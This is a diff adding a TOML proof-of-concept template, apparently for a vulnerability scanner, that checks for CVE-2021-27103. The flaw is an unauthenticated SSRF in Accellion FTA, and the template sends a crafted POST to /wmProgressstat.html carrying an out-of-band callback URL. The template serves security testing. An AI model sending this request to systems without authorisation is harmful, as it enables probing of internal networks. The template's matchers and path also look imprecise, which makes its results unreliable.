@@ -1,0 +1,38 @@
+[info]
+author = "ave"
+description = "Accellion FTA 9_12_411 及更早版本存在服务端请求伪造（SSRF）漏洞。通过向 /wmProgressstat.html 发送特制 POST 请求，攻击者可在服务器端伪造请求访问内网资源或外部系统。该漏洞无需身份验证即可利用。"
+id = "POC-AVE-2021-1111"
+name = "CVE-2021-27103 Accellion FTA SSRF PoC"
+severity = "critical"
+tags = ["ave-2021-1111"]
+vuln_id = [
+    "CVE-2021-27103",
+    "AVE-2021-1111",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wmProgressstat.html"
+protocol = "http"
+
+[poc.requests.body]
+content = "url_param={{interactsh-url}}"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["progress"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
